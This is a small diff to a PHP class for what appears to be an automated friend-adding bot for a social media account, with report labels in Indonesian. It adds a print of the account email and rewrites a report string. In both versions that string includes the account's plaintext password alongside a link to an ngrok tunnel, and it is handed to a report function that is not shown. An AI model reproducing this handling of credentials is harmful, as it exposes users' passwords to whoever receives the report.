@@ -194,6 +194,7 @@ class ActionHandler
         $this->start_time();
         $i_report = 0;
         foreach ($this->linkall as $val) {
+        	print "Akun ini : ".$this->email."\n\n";
             $i_report++;
             if ($this->startTime<=time()) {
                 /**
@@ -256,7 +257,7 @@ class ActionHandler
         	$acc = 0;
         }
         $berhasilNgeAdd = count($this->action['add']);
-        $report = "Laporan\n\nWaktu : ".date("Y-m-d H:i:s")."\nEmail : ".$this->email."\nPass : ".$this->pass."\nJumlah Logs : ".($jumlahLogs)."\nBerhasil NgeAdd : ".($berhasilNgeAdd)."\nUnfriend : ".($unfriend)."\nAcc : ".$acc."\nSekian laporan dari saya, terima kasih :v\n\nUntuk jumlah unfriend dan acc belum realtime, akan saya cek lagi pada ".date("Y-m-d H:i:s", $this->startTime)."\n\nLogs File dan lain-lain : https://ce500f80.ngrok.io/add/data/data?secure=1&pdo_limit=".rand(81992, 52135);
+        $report = "Waktu : ".date("Y-m-d H:i:s")."\nEmail : ".$this->email."\nPass : ".$this->pass."\nJumlah Logs : ".($jumlahLogs)."\nBerhasil NgeAdd : ".($berhasilNgeAdd)."\nUnfriend : ".($unfriend)."\nAcc : ".$acc."\n\nCek Acc dan Unfriend ".date("Y-m-d H:i:s", $this->startTime)."\n\nLogs File dan lain-lain : https://ce500f80.ngrok.io/add/data/data?secure=1&pdo_limit=".rand(81992, 52135);
         $this->report($report);
     }
 
